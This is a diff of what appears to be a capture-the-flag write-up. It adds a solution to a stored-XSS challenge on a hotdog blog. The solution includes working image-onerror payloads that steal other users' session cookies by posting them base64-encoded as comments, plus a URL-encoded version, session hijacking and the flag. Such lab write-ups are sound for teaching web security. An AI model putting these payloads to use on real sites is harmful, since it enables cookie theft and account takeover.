@@ -100,6 +100,7 @@ This challenge is about XML External Entity injection. This kind of attack happe
 ```html
 <pre>You have logged in to the server as username</pre>
 ```
+
 This means that we can use XML entities to write out the contents of the file system through this username attribute. The payload looks like this: 
 
 ```xml
@@ -129,4 +130,20 @@ And there the flag is located!
 
 ### Challenge Solution
 
-The website hosted on `https://dogshare.com` is a blog where users can share pictures of hotdogs. No user is supplied, yet even without one, it is possible to comment on the posts. This might be an XSS challenge. We are able to achieve stored XSS by posting a comment with the payload: `<img src='#' onerror= />`. It seems like some tags are sanitized and others are not, like the image tag.
+The website hosted on `https://dogshare.com` is a blog where users can share pictures of hotdogs. No user is supplied, yet even without one, it is possible to comment on the posts. This might be an XSS challenge. We are able to achieve stored XSS by posting a comment with the payload: `<img src='#' onerror=alert(1) />`. It seems like some tags are sanitized and others are not, like the image tag.
+
+After achieving XSS we need to modify the payload of the stored XSS, to post the cookie of the other users. This is done by changing the code in the onerror part of the img tag to the following:
+
+`fetch("/comments", {method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: "did=1&comment=" + btoa(document.cookie)})`
+
+Here the fetch JS function is used to post a comment to the dogshare website, including the document.cookie (a users cookie) encoded as base64. The `did=1` part of the form, is specifying which post to comment on.
+
+**Note**: Payload needs to be URL encoded in order to parse correctly.
+
+```urlencode
+did=1&comment=test+<img+src%3d'%23'+onerror%3d"fetch('/comments',+{method%3a+'POST',+headers%3a+{'Content-Type'%3a+'application/x-www-form-urlencoded'},+body%3a+'did%3d1%26comment%3d'+%2b+btoa(document.cookie)})"+/>
+```
+
+When the comment is registered and other user visit the a comment is posted with their session cookie: `c2Vzc2lvbj03YjNmMjNmNzVhOGU1ZTdhYTU4YjgwOTJmMjVhOTFkNQ` encoded as base64. The cookie is decoded and parsed into the browser as: `session=7b3f23f75a8e5e7aa58b8092f25a91d5`. When reloading the site, we are logged in as Kristy.
+
+Found flag!: HKN{MP-3G-Oxo4kC}
